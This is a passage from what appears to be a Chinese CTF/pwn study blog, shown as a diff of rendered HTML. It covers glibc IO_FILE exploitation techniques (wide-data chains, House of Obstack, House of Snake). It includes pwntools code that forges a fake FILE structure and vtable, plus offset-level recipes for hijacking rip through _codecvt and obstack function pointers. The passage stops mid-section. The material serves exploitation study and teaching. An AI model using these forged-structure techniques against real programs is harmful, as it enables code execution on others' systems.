+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xFFFFFFFFFFFFFFFF</span><span class="p">)</span>  <span class="c1"># _old_offset, -1</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># _cur_column</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span>  <span class="c1"># _vtable_offset</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span>  <span class="c1"># _shortbuf[1]</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># padding</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;_IO_2_1_stdout_&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x1ea0</span><span class="p">)</span>  <span class="c1"># _IO_stdfile_1_lock</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xFFFFFFFFFFFFFFFF</span><span class="p">)</span>  <span class="c1"># _offset, -1</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">codecvt_addr</span><span class="p">)</span>  <span class="c1"># _codecvt, usually 0</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x1000</span><span class="p">)</span>  <span class="c1"># _IO_wide_data_1</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span>  <span class="c1"># from _freeres_list to __pad5</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xFFFFFFFF</span><span class="p">)</span>  <span class="c1"># _mode, usually -1</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="mi">19</span>  <span class="c1"># _unused2</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">=</span> <span class="n">fake_file</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xD8</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>  <span class="c1"># adjust to vtable</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;_IO_wfile_jumps&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span>  <span class="c1"># fake vtable</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">frame_addr</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>② <code>_IO_wfile_underflow_mmap</code></p>
+<p><strong>利用</strong></p>
+<p>fp设置</p>
+<ul>
+<li><code>_flags</code>设置为<code>~4</code></li>
+<li><code>vtable</code>设置为<code>_IO_wfile_jumps_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_underflow_mmap</code>即可</li>
+<li><code>_IO_read_ptr &lt; _IO_read_end</code>，即满足<code>*(fp + 8) &lt; *(fp + 0x10)</code></li>
+<li><code>_wide_data</code>保持默认，或者设置为堆地址，假设其地址为<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
+<li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>，即满足<code>*A &gt;= *(A + 8)</code></li>
+<li><code>_wide_data-&gt;_IO_buf_base</code>设置为非<code>0</code>，即满足<code>*(A + 0x30) != 0</code></li>
+<li><code>_codecvt</code>设置为可控堆地址<code>B</code>，即满足<code>*(fp + 0x98) = B</code></li>
+<li><code>codecvt-&gt;__cd_in.step</code>设置为可控堆地址<code>C</code>，即满足<code>*B = C</code></li>
+<li><code>codecvt-&gt;__cd_in.step-&gt;__shlib_handle</code>设置为<code>0</code>，即满足<code>*C = 0</code></li>
+<li><code>codecvt-&gt;__cd_in.step-&gt;__fct</code>设置为地址<code>D</code>,地址<code>D</code>用于控制<code>rip</code>，即满足<code>*(C + 0x28) = D</code>。当调用到<code>D</code>的时候，此时的<code>rdi</code>为<code>C</code>。如果<code>_wide_data</code>也可控的话，<code>rsi</code>也能控制</li>
+</ul>
+<p><strong>调用链</strong>：<code>_IO_wfile_underflow_mmap</code> &gt; <code>__libio_codecvt_in</code> &gt; <code>DL_CALL_FCT</code> &gt; <code>gs = fp-&gt;_codecvt-&gt;__cd_in.step</code> &gt; <code>*(gs-&gt;__fct)(gs)</code></p>
+<p>③ <code>_IO_wdo_write</code></p>
+<p><strong>原理</strong></p>
+<ul>
+<li>满足<code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code></li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// _IO_new_file_sync
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">&gt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">_IO_do_flush</span><span class="p">(</span><span class="n">fp</span><span class="p">))</span> <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span><span class="c1">// 调用到此
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li><code>fp-&gt;_mode &gt; 0</code>来调用后者<code>_IO_wdo_write</code></li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#define _IO_do_flush(_f)
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>  <span class="p">((</span><span class="n">_f</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">&lt;=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">   <span class="o">?</span> <span class="n">_IO_do_write</span><span class="p">(</span><span class="n">_f</span><span class="p">,</span> <span class="p">(</span><span class="n">_f</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">          <span class="p">(</span><span class="n">_f</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span><span class="o">-</span><span class="p">(</span><span class="n">_f</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">   <span class="o">:</span> <span class="n">_IO_wdo_write</span><span class="p">(</span><span class="n">_f</span><span class="p">,</span> <span class="p">(</span><span class="n">_f</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">           <span class="p">((</span><span class="n">_f</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span>
+</span></span><span class="line"><span class="cl">            <span class="o">-</span> <span class="p">(</span><span class="n">_f</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">)))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>需要控制<code>fp-&gt;_wide_data</code></li>
+</ul>
+<p><strong>利用</strong></p>
+<p>fp设置</p>
+<ul>
+<li><code>vtable</code>设置为<code>_IO_file_jumps/</code>地址（加减偏移），使其能成功调用<code>_IO_new_file_sync</code>即可</li>
+<li><code>_IO_write_ptr &gt; _IO_write_base</code>，即满足<code>*(fp + 0x28) &gt; *(fp + 0x20)</code></li>
+<li><code>_mode &gt; 0</code>，即满足<code>(fp + 0xc0) &gt; 0</code></li>
+<li><code>_IO_write_end != _IO_write_ptr</code>或者<code>_IO_write_end == _IO_write_base</code>，即满足<code>*(fp + 0x30) != *(fp + 0x28)</code>或者<code>*(fp + 0x30) == *(fp + 0x20)</code></li>
+<li><code>_wide_data</code>设置为堆地址，假设地址为<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
+<li><code>_wide_data-&gt;_IO_write_ptr &gt;= _wide_data-&gt;_IO_write_base</code>，即满足<code>*(A + 0x20) &gt;= *(A + 0x18)</code></li>
+<li><code>_codecvt</code>设置为可控堆地址<code>B</code>，即满足<code>*(fp + 0x98) = B</code></li>
+<li><code>codecvt-&gt;__cd_out.step</code>设置为可控堆地址<code>C</code>，即满足<code>*(B + 0x38) = C</code></li>
+<li><code>codecvt-&gt;__cd_out.step-&gt;__shlib_handle</code>设置为<code>0</code>，即满足<code>*C = 0</code></li>
+<li><code>codecvt-&gt;__cd_out.step-&gt;__fct</code>设置为地址<code>D</code>,地址<code>D</code>用于控制<code>rip</code>，即满足<code>*(C + 0x28) = D</code>。当调用到<code>D</code>的时候，此时的<code>rdi</code>为<code>C</code>。如果<code>_wide_data</code>也可控的话，<code>rsi</code>也能控制</li>
+</ul>
+<p><strong>调用链</strong>：<code>_IO_new_file_sync</code> &gt; <code>_IO_do_flush</code> &gt; <code>_IO_wdo_write</code> &gt; <code>__libio_codecvt_out</code> &gt; <code>DL_CALL_FCT</code> &gt; <code>gs = fp-&gt;_codecvt-&gt;__cd_out.step</code> &gt; <code>*(gs-&gt;__fct)(gs)</code></p>
+<p>④ <code>_IO_wfile_sync</code></p>
+<p>fp设置</p>
+<ul>
+<li><code>_flags</code>设置为<code>~(4 | 0x10)</code></li>
+<li><code>vtable</code>设置为<code>_IO_wfile_jumps</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_sync</code>即可</li>
+<li><code>_wide_data</code>设置为堆地址，假设其地址为<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
+<li><code>_wide_data-&gt;_IO_write_ptr &lt;= _wide_data-&gt;_IO_write_base</code>，即满足<code>*(A + 0x20) &lt;= *(A + 0x18)</code></li>
+<li><code>_wide_data-&gt;_IO_read_ptr != _wide_data-&gt;_IO_read_end</code>，即满足<code>*A != *(A + 8)</code></li>
+<li><code>_codecvt</code>设置为可控堆地址<code>B</code>，即满足<code>*(fp + 0x98) = B</code></li>
+<li><code>codecvt-&gt;__cd_in.step</code>设置为可控堆地址<code>C</code>，即满足<code>*B = C</code></li>
+<li><code>codecvt-&gt;__cd_in.step-&gt;__stateful</code>设置为非<code>0</code>，即满足<code>*(B + 0x58) != 0</code></li>
+<li><code>codecvt-&gt;__cd_in.step-&gt;__shlib_handle</code>设置为<code>0</code>，即满足<code>*C = 0</code></li>
+<li><code>codecvt-&gt;__cd_in.step-&gt;__fct</code>设置为地址<code>D</code>,地址<code>D</code>用于控制<code>rip</code>，即满足<code>*(C + 0x28) = D</code>。当调用到<code>D</code>的时候，此时的<code>rdi</code>为<code>C</code>。如果<code>rsi</code>为<code>&amp;codecvt-&gt;__cd_in.step_data</code>可控</li>
+</ul>
+<p><strong>调用链</strong>：<code>_IO_wfile_sync</code> &gt; <code>__libio_codecvt_length</code> &gt; <code>DL_CALL_FCT</code> &gt; <code>gs = fp-&gt;_codecvt-&gt;__cd_in.step</code> &gt; <code>*(gs-&gt;__fct)(gs)</code></p>
 <h4 id="house-of-obstack">House of Obstack</h4>
+<ul>
+<li>
+<p>&lt;glibc-2.37，利用<code>_IO_obstack_jumps</code>，其中<code>_IO_obstack_overflow</code>和 <code>_IO_obstack_xsputn</code> 都可触发</p>
+</li>
+<li>
+<p><strong>攻击链</strong></p>
+</li>
+<li>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">_IO_obstack_overflow</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">obstack_1grow</span> <span class="p">(</span><span class="n">obstack</span><span class="p">,</span> <span class="n">c</span><span class="p">);</span> <span class="c1">// c 不可控
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">_obstack_newchunk</span> <span class="p">(</span><span class="n">__o</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">                         <span class="n">new_chunk</span> <span class="o">=</span> <span class="n">CALL_CHUNKFUN</span> <span class="p">(</span><span class="n">h</span><span class="p">,</span> <span class="n">new_size</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                                     <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">h</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">chunkfun</span><span class="p">)((</span><span class="n">h</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">extra_arg</span><span class="p">,</span> <span class="p">(</span><span class="n">size</span><span class="p">))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">_IO_obstack_xsputn</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">obstack_grow</span> <span class="p">(</span><span class="n">obstack</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">n</span><span class="p">);;</span>
+</span></span><span class="line"><span class="cl">                <span class="n">_obstack_newchunk</span> <span class="p">(</span><span class="n">__o</span><span class="p">,</span> <span class="n">__len</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                         <span class="n">new_chunk</span> <span class="o">=</span> <span class="n">CALL_CHUNKFUN</span> <span class="p">(</span><span class="n">h</span><span class="p">,</span> <span class="n">new_size</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                                     <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">h</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">chunkfun</span><span class="p">)((</span><span class="n">h</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">extra_arg</span><span class="p">,</span> <span class="p">(</span><span class="n">size</span><span class="p">))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+</ul>
+<p>实际第一条链易触发<code>assert(c != EOF);</code>，一般选择第二条链</p>
+<p><strong>原理</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">_IO_obstack_file</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">_IO_FILE_plus</span> <span class="n">file</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">obstack</span> <span class="o">*</span><span class="n">obstack</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">obstack</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 只列举劫持
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">struct</span> <span class="n">_obstack_chunk</span> <span class="o">*</span><span class="p">(</span><span class="o">*</span><span class="n">chunkfun</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">,</span> <span class="kt">long</span><span class="p">);</span> <span class="c1">// 需要伪造成劫持的地址
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">void</span> <span class="o">*</span><span class="n">extra_arg</span><span class="p">;</span> <span class="c1">// 参数
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">unsigned</span> <span class="nl">use_extra_arg</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>利用</strong></p>
+<p><img src="/img/pwn_note.zh-cn.assets/image-20250126223346993.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250126223346993"
+	
+	
+></p>
 <h4 id="house-of-snake">House of Snake</h4>
+<ul>
+<li>glibc-2.37删除了<code>_IO_obstack_jumps</code>，增加了<code>_IO_printf_buffer_as_file_jumps</code>新<code>_IO_jumps_t</code>结构体，其只有<code>__printf_buffer_as_file_overflow</code>和<code>__printf_buffer_as_file_xsputn</code>2个函数</li>
+<li>利用<code>__printf_buffer_as_file_overflow</code></li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">_IO_jump_t</span> <span class="n">_IO_printf_buffer_as_file_jumps</span> <span class="n">libio_vtable</span> <span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT_DUMMY</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">finish</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">overflow</span><span class="p">,</span> <span class="n">__printf_buffer_as_file_overflow</span><span class="p">),</span> <span class="c1">// 利用
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">underflow</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">uflow</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">pbackfail</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">xsputn</span><span class="p">,</span> <span class="n">__printf_buffer_as_file_xsputn</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">xsgetn</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">seekoff</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">seekpos</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">setbuf</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">sync</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">doallocate</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">read</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">write</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">seek</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">close</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">stat</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">showmanyc</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">imbue</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>原理</strong></p>
+<p><code>__printf_buffer_as_file_overflow</code>函数</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">__printf_buffer_as_file_overflow</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="kt">int</span> <span class="n">ch</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// 将 FILE 结构体 fp 转换为 __printf_buffer_as_file 类型
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">struct</span> <span class="n">__printf_buffer_as_file</span> <span class="o">*</span><span class="n">file</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">__printf_buffer_as_file</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm">    struct __printf_buffer_as_file
+</span></span></span><span class="line"><span class="cl"><span class="cm">    {
+</span></span></span><span class="line"><span class="cl"><span class="cm">      FILE stream;
+</span></span></span><span class="line"><span class="cl"><span class="cm">      const struct _IO_jump_t *vtable;
+</span></span></span><span class="line"><span class="cl"><span class="cm">      
+</span></span></span><span class="line"><span class="cl"><span class="cm">      struct __printf_buffer *next;
+</span></span></span><span class="line"><span class="cl"><span class="cm">    };
+</span></span></span><span class="line"><span class="cl"><span class="cm">    
+</span></span></span><span class="line"><span class="cl"><span class="cm">    struct __printf_buffer
+</span></span></span><span class="line"><span class="cl"><span class="cm">    {
+</span></span></span><span class="line"><span class="cl"><span class="cm">      char *write_base;
+</span></span></span><span class="line"><span class="cl"><span class="cm">      char *write_ptr;
+</span></span></span><span class="line"><span class="cl"><span class="cm">      char *write_end;
+</span></span></span><span class="line"><span class="cl"><span class="cm">      uint64_t written;
+</span></span></span><span class="line"><span class="cl"><span class="cm">      enum __printf_buffer_mode mode;
+</span></span></span><span class="line"><span class="cl"><span class="cm">    };
+</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">__printf_buffer_as_file_commit</span> <span class="p">(</span><span class="n">file</span><span class="p">);</span> <span class="c1">// 进行了一系列断言检查
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">ch</span> <span class="o">!=</span> <span class="n">EOF</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">__printf_buffer_putc</span> <span class="p">(</span><span class="n">file</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">,</span> <span class="n">ch</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// if判断条件1需要满足: buf-&gt;mode != __printf_buffer_mode_failed
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">__printf_buffer_has_failed</span> <span class="p">(</span><span class="n">file</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">      <span class="o">&amp;&amp;</span> <span class="n">file</span><span class="o">-&gt;</span><span class="n">next</span><span class="o">-&gt;</span><span class="n">write_ptr</span> <span class="o">==</span> <span class="n">file</span><span class="o">-&gt;</span><span class="n">next</span><span class="o">-&gt;</span><span class="n">write_end</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">__printf_buffer_flush</span> <span class="p">(</span><span class="n">file</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">);</span> <span class="c1">// 到此处
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">__printf_buffer_as_file_switch_to_buffer</span> <span class="p">(</span><span class="n">file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">__printf_buffer_has_failed</span> <span class="p">(</span><span class="n">file</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="p">)</span> <span class="n">ch</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>检查绕过</p>
